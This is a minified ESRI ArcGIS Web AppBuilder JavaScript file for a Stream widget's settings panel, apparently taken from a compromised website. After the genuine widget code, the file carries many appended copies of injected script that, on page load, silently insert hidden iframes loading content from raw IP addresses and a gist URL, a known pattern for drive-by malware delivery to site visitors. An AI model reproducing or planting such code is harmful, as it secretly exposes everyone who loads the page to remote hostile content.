// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Stream/setting/StreamSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"detailSection" class\x3d"detail"\x3e\r\n    \x3cdiv\x3e\r\n      \x3cdiv class\x3d"titleContainer"\x3e\r\n        \x3clabel class\x3d"jimu-widget-title"\x3e${nls.streamControls}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"startStopCheckBoxDiv" class\x3d"checkboxContainer jimu-widget-tooltip"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"clearPreviousCheckBoxDiv" class\x3d"checkboxContainer jimu-widget-tooltip"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"drawPreviousCheckBoxDiv" class\x3d"checkboxContainer jimu-widget-tooltip"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3cdiv class\x3d"titleContainer"\x3e\r\n        \x3clabel class\x3d"jimu-widget-title"\x3e${nls.streamFilter}\x3c/label\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"spatialFilterCheckBoxDiv" class\x3d"checkboxContainer jimu-widget-tooltip"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"spatialChoices"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"mapExtentCheckBoxDiv" class\x3d"subCheckboxContainer jimu-widget-tooltip"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"subCheckboxContainer"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"drawExtentCheckBoxDiv" class\x3d"jimu-widget-tooltip" style\x3d"display:inline"\x3e\x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"symbolPickerNode" style\x3d"display:none"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"filterCheckBoxDiv" class\x3d"jimu-widget-tooltip"\r\n             class\x3d"checkboxContainer" style\x3d"display: inline-block"\x3e\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"filterIcon" class\x3d"filterIcon disabled jimu-leading-margin05"\r\n          data-dojo-attach-event\x3d"onClick: _showFilter"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./StreamSetting.html dojo/dom-class dojo/dom-style dojo/Evented esri/symbols/jsonUtils jimu/dijit/CheckBox jimu/dijit/SymbolPicker ./FilterConfigPopup ../FilterUtil jimu/dijit/LoadingShelter".split(" "),function(g,d,e,h,k,l,m,f,b,n,p,c,q,r,t){return g([h,k,l,n],{baseClass:"jimu-widget-stream-setting",templateString:m,map:null,nls:null,layerName:null,streamLayer:null,_filterList:[],
_started:!1,postCreate:function(){this.inherited(arguments);var a=null;this._filterList=[];this.startStopCheckBox=new c({checked:!0,label:this.nls.startStopStream});this.startStopCheckBox.placeAt(this.startStopCheckBoxDiv);this.clearPreviousCheckBox=new c({checked:!0,label:this.nls.clearStream});this.clearPreviousCheckBox.placeAt(this.clearPreviousCheckBoxDiv);this.drawPreviousCheckBox=new c({checked:!1,label:this.nls.drawPrevious});this.drawPreviousCheckBox.placeAt(this.drawPreviousCheckBoxDiv);
this.streamLayer&&(1===this.streamLayer.maximumTrackPoints?this.drawPreviousCheckBox.setStatus(!1):1<this.streamLayer.maximumTrackPoints&&this.drawPreviousCheckBox.setValue(!0));this.spatialFilterCheckBox=new c({checked:!0,label:this.nls.spatialFilter,onChange:d.hitch(this,this._spatialStatusChange)});this.spatialFilterCheckBox.placeAt(this.spatialFilterCheckBoxDiv);this.mapExtentCheckBox=new c({checked:!1,label:this.nls.limitMapExtent});this.mapExtentCheckBox.placeAt(this.mapExtentCheckBoxDiv);this.drawExtentCheckBox=
new c({checked:!1,label:this.nls.limitDrawExtent,onChange:d.hitch(this,function(a){a?b.set(this.symbolPickerNode,"display","inline"):b.set(this.symbolPickerNode,"display","none")})});b.set(this.drawExtentCheckBox.domNode,"vertical-align","top");this.drawExtentCheckBox.placeAt(this.drawExtentCheckBoxDiv);this.config&&this.config.drawSymbol&&(a=p.fromJson(this.config.drawSymbol));this.symbolPicker=new q({symbol:a,type:"fill"});b.set(this.symbolPicker.domNode,"margin-top","-16px");this.symbolPicker.placeAt(this.symbolPickerNode);
this.symbolPicker.startup();this.filterCheckBox=new c({checked:!1,label:this.nls.attributeFilter,onChange:d.hitch(this,this._filterStatusChange)});this.filterCheckBox.placeAt(this.filterCheckBoxDiv);this.config?this.setConfig(this.config):this.streamLayer&&this.streamLayer.getDefinitionExpression()&&(this.shelter.show(),t.buildFilterInfoFromString(this.streamLayer,this.streamLayer.getDefinitionExpression(),this.nls.newFilter).then(d.hitch(this,function(a){null!==a&&(this._filterList.push(a),this.filterCheckBox.setValue(!0),
this.filterCheckBox.setStatus(!1));this.shelter.hide()})))},setConfig:function(a){this.config=a;this.layerName=this.config.layerName;this._filterList=this.config.filterList;this.startStopCheckBox.setValue(this.config.startStop);this.clearPreviousCheckBox.setValue(this.config.clear);this.drawPreviousCheckBox.setValue(this.config.drawPrevious);this.spatialFilterCheckBox.setValue(this.config.spatialFilter);this.mapExtentCheckBox.setValue(!!this.config.mapExtentFilter);this.drawExtentCheckBox.setValue(!!this.config.drawExtentFilter);
this.config.drawExtentFilter?b.set(this.symbolPickerNode,"display","inline"):b.set(this.symbolPickerNode,"display","none");this.filterCheckBox.setValue(this.config.attrFilter)},getConfig:function(){var a={layerId:this.streamLayer.id,layerName:this.layerName||"",startStop:this.startStopCheckBox.getValue(),clear:this.clearPreviousCheckBox.getValue(),drawPrevious:this.drawPreviousCheckBox.getValue(),spatialFilter:this.spatialFilterCheckBox.getValue(),mapExtentFilter:this.mapExtentCheckBox.getValue(),
drawExtentFilter:this.drawExtentCheckBox.getValue(),attrFilter:this.filterCheckBox.getValue(),filterList:this._filterList};a.mapExtentFilter||a.drawExtentFilter||(a.spatialFilter=!1);a.drawExtentFilter&&(a.drawSymbol=this.symbolPicker.getSymbol().toJson());return a},_filterStatusChange:function(a){a?f.remove(this.filterIcon,"disabled"):f.add(this.filterIcon,"disabled")},_spatialStatusChange:function(a){a?b.set(this.spatialChoices,"display","block"):b.set(this.spatialChoices,"display","none")},_showFilter:function(){if(this.filterCheckBox.getValue()){var a;
a=new r({titleLabel:this.nls.configFilter,filterList:this._filterList,streamLayer:this.streamLayer,nls:this.nls});this.own(e(a,"ok",d.hitch(this,function(b){this._filterList=b;a.close()})));this.own(e(a,"cancel",d.hitch(this,function(){a.close()})));a.startup()}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});